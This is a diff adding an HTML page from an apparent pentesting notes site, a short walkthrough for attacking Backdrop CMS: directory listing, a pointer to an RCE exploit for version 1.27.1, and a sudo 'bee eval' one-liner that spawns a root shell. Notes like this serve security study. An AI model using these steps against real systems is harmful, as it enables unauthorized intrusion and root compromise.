@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Maven+Pro:wght@400..900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/navBarStyles.css">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/walkthroughs.css">
+        <link href="/H4ckV4ult/styles/prism/prism.css" rel="stylesheet" />
+    <script src="/H4ckV4ult/styles/prism/prism.js"></script>
+    <title>Minimalist Webpage</title>
+
+</head>
+<body>
+    <div id="navbar-container"></div>
+    <script src="/H4ckV4ult/components/navbar.js"></script>
+
+    <div class="notion-container">
+        <div class="notion-header">
+            <h1>Backdrop (TCP/80)</h1>
+            <p>Backdrop CMS is a free and Open Source Content Management System that helps you build modern, comprehensive websites on a reasonable budget.</p>
+        </div>
+        <div class="notion-body">
+            <h2>Enumeration</h2>
+            <ul>    
+                <h3>Directory listing</h3>
+                <ul>
+                <p>Backdrop may not be configured properly in that case an attacker could perform a directory listing. Interesting directories can be found</p>
+                <pre><code class="language-bash">/core
+/files
+/.git</code></pre>
+                <p>An interesting file to checkout is <b>update.settings.json</b> it may contain users</p>
+                </ul>
+            </ul>
+            <h2>Exploitation</h2>
+            <ul>
+            <h3>Remote code execution</h3>
+            <ul>
+                <p>The version 1.27.1 it is affected by an authenticated remote code execution  <a class="notion-link" href="https://github.com/rvizx/backdrop-rce">Can be found here</a></p>
+            </ul>
+            </ul>
+            <ul>
+            <h3>Privilege Escalation</h3>
+                <ul>
+                <p>Backdrop internally uses bee which is a command line utility for Backdrop CMS. In case we can run the binary using sudo permisions we can execute a shell with root</p>
+                <pre><code class="language-bash">sudo bee --rot=/var/www/html eval 'system("/bin/bash");'</code></pre>
+                </ul>
+            </ul>    
+        </div>
+    </div>
+</body>
+</html>
